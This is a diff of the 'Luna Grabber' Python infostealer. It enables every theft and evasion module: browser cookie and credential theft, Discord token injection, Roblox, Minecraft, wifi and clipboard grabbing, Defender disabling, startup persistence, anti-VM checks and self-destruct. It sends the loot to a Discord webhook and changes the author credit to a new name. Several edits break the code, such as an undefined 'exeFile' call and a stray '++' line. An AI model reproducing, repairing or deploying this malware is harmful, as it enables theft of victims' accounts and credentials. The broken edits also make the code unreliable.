@@ -24,25 +24,25 @@ from win32crypt import CryptUnprotectData
 
 __CONFIG__ = {
     "webhook": "None",
-    "ping": False,
+    "ping": True,
     "pingtype": "None",
     "fakeerror": False,
-    "startup": False,
-    "defender": False,
-    "systeminfo": False,
-    "backupcodes": False,
-    "browser": False,
-    "roblox": False,
-    "obfuscation": False,
-    "injection": False,
-    "minecraft": False,
-    "wifi": False,
-    "killprotector": False,
-    "antidebug_vm": False,
-    "discord": False,
-    "anti_spam": False,
-    "self_destruct": False,
-    "clipboard": False
+    "startup": True,
+    "defender": True,
+    "systeminfo": True,
+    "backupcodes": True,
+    "browser": True,
+    "roblox": True,
+    "obfuscation": True,
+    "injection": True,
+    "minecraft": True,
+    "wifi": True,
+    "killprotector": True,
+    "antidebug_vm": True,
+    "discord": True,
+    "anti_spam": True,
+    "self_destruct": True,
+    "clipboard": True
 }
 
 #global variables
@@ -66,7 +66,7 @@ def main(webhook: str):
         "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
     }
 
-    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.exe'
 
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
@@ -75,7 +75,7 @@ def main(webhook: str):
 
     if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
         with open(_file, 'rb') as file:
-            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.exe', file, 'application/exe')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
     else:
         requests.post(webhook, json=data)
@@ -178,8 +178,8 @@ def killprotector():
                 item = json.load(f)
             except json.decoder.JSONDecodeError:
                 return
-            item['auto_start'] = False
-            item['auto_start_discord'] = False
+            item['auto_start'] = True
+            item['auto_start_discord'] = True
             item['integrity'] = False
             item['integrity_allowbetterdiscord'] = False
             item['integrity_checkexecutable'] = False
@@ -198,7 +198,7 @@ def killprotector():
 
 def zipup():
     _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
-    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
+    zipped_file = exeFile(_exefile, "w", exe_DEFLATED)
     for dirname, _, files in os.walk(temp_path):
         for filename in files:
             absname = os.path.join(dirname, filename)
@@ -236,7 +236,7 @@ class PcInfo:
                         }
                     ],
                     "footer": {
-                        "text": "Luna Grabber | Created By Smug"
+                        "text": "Luna Grabber | Created By Ziggy"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
@@ -411,7 +411,7 @@ class Discord:
                                         "url": info['ThumbnailUrl']
                                     },
                                     "footer": {
-                                        "text": "Luna Grabber | Created By Smug"
+                                        "text": "Luna Grabber | Created By Ziggy"
                                     },
                                 }
                             ],
@@ -474,7 +474,7 @@ class Discord:
                             "url": avatar_url
                         },
                         "footer": {
-                            "text": "Luna Grabber | Created By Smug"
+                            "text": "Luna Grabber | Created By Ziggy"
                         },
                     }
                 ],
@@ -660,7 +660,7 @@ class Browsers:
         cursor.close()
         conn.close()
         os.remove(cookievault)
-
++
     def history(self, name: str, path: str, profile: str):
         if name == 'opera' or name == 'opera-gx':
             path += '\\History'
